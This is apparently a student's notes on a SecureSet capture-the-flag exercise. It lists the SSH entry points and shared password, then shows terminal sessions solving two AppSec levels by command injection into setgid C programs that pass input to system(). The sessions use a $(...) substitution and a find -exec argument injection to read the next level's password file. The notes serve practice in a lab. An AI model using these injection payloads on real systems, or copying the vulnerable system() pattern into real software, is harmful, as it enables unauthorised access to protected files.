
scoreboard:
ctf.secureset.com:10000

Linux:
ssh -p 10002 lev1@ctf.secureset.com

Steganography:
ssh -p 10003 lev1@ctf.secureset.com

Appsec:
ssh -p 10005 lev1@ctf.secureset.com

Crypto:
ssh -p 10004 lev1@ctf.secureset.com

Password: password


Appsec:

nulladdr@unknown:~$ ssh -p 10005 lev4@ctf.secureset.com

lev4@SecureSet-CTF-AppSec:~$ cd /var/challenge/level4
lev4@SecureSet-CTF-AppSec:/var/challenge/level4$ ls
appsec4  appsec4.c  pass5
lev4@SecureSet-CTF-AppSec:/var/challenge/level4$ cat appsec4.c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char **argv)
{

	if( argc != 2)
	{
		printf("Usage: %s <input>\n",argv[0]);
		return(1);
	}

	char buf[128];

        if( strchr(argv[1], '|') || strchr(argv[1], '`') ||
                strchr(argv[1], '&') || strchr(argv[1], '>') ||
                strchr(argv[1], '<') || strchr(argv[1], ';'))
        {
                fprintf(stderr, "Command contains prohibited characters\n");
                exit(1);
        }

	snprintf(buf, 129, "/bin/echo %s", argv[1]);

	system(buf);

	return 1;
}
lev4@SecureSet-CTF-AppSec:/var/challenge/level4$ ./appsec4 '$(cat pass5)'
5CfdaoV1zlDm


nulladdr@unknown:~$ ssh -p 10005 lev5@ctf.secureset.com

lev5@SecureSet-CTF-AppSec:~$ cd /var/challenge/level5/
lev5@SecureSet-CTF-AppSec:/var/challenge/level5$ ls -l
total 16
-rwxr-sr-x 1 overlord lev6 7496 Mar 22  2018 appsec5
-rw-r--r-- 1 overlord lev5  822 Sep 13  2017 appsec5.c
-rw-r----- 1 overlord lev6   13 Sep 13  2017 pass6

lev5@SecureSet-CTF-AppSec:/var/challenge/level5$ cat appsec5.c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
  char buf[1024];
  int i, j;

  if (argc < 2) {
    fprintf(stderr, "Not enough args\n");
    return 1;
  }

  /* Sanitize the string for great good! */
  for (i = 1; i < argc; i++) {
    for (j = 0; j < strlen(argv[i]); j++) {
      if ((argv[i][j] == '&') ||
	      (argv[i][j] == '>') ||
	      (argv[i][j] == '<') ||
	      (argv[i][j] == '$') ||
	      (argv[i][j] == '`') ||
	      (argv[i][j] == ';') ||
	      (argv[i][j] == '|')) {
		fprintf(stderr, "Input contains prohibited characters\n");
		return 2;
      } else if (argv[i][j] == '\\') {
        ++ j;
      }
    }
  }
    
  for (i = 1; i < argc; i++) {
    snprintf(buf, 1023, "/usr/bin/find /home -iname %s", argv[i]);
    system(buf);
  }
  
  exit(0);
}

From `man find`:

       -iname pattern
              Like -name, but the match is case insensitive.  For example, the
              patterns `fo*' and `F??' match  the  file  names  `Foo',  `FOO',
              `foo',  `fOo', etc.   The pattern `*foo*` will also match a file
              called '.foobar'.

       -exec command ;
              Execute  command;  true  if 0 status is returned.  All following
              arguments to find are taken to be arguments to the command until
              an  argument  consisting of `;' is encountered.  The string `{}'
              is replaced by the current file name being processed  everywhere
              it occurs in the arguments to the command, not just in arguments
              where it is alone, as in some versions of find.  Both  of  these
              constructions might need to be escaped (with a `\') or quoted to
              protect them from expansion by the shell.  See the EXAMPLES sec‐
              tion for examples of the use of the -exec option.  The specified
              command is run once for each matched file.  The command is  exe‐
              cuted  in  the starting directory.   There are unavoidable secu‐
              rity problems surrounding use of the -exec  action;  you  should
              use the -execdir option instead.

lev5@SecureSet-CTF-AppSec:/var/challenge/level5$ find /home -iname lev5 -exec echo hello \; 2> /dev/null
hello

lev5@SecureSet-CTF-AppSec:/var/challenge/level5$ ./appsec5 "lev5 -exec echo hello \;" 2> /dev/null
hello

ureSet-CTF-AppSec:/var/challenge/level5$ ./appsec5 "lev5 -exec cat /var/challenge/level5/pass6 \;" 2> /dev/null
QxWQYF81R6Sk

